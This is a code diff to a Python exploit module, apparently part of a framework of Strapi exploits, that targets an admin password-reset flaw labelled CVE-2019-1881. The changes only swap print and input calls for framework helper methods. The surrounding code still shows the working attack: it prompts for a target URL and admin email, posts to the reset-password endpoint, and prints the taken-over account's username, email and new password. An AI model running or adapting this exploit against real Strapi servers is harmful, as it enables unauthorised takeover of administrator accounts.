@@ -25,20 +25,20 @@ class CVE2019_1881(StrapiExploitInterface):
             r = requests.post(f"{url}/admin/auth/reset-password", json=params, timeout=10).json()
             if "jwt" not in r:
                 return False
-            print(f"[ + ] Password reset successfull.\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}\nPassword: {password}")
+            self.success(f"Password reset successfull.\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}\nPassword: {password}")
             return True
         except JSONDecodeError:
             return False
     def run(self) -> bool:
-        url = input("Enter the URL of the Strapi instance: ")
+        url = self.input("Enter the URL of the Strapi instance")
         if url.endswith("/"):
             url = url[:-1]
         version = self.get_strapi_version(url)
         if not self.check_if_vulnerable(version):
-            print(f"[!] Strapi version {version} is not vulnerable.")
+            self.error("The Strapi instance is not vulnerable.")
             return True
-        email = input("[+] Admin email: ")
-        password = input("[+] Enter the new password: ")
+        email = self.input("[+] Admin email: ")
+        password = self.input("[+] Enter the new password: ")
         self.exploit(url, email, password)
 
 def init():
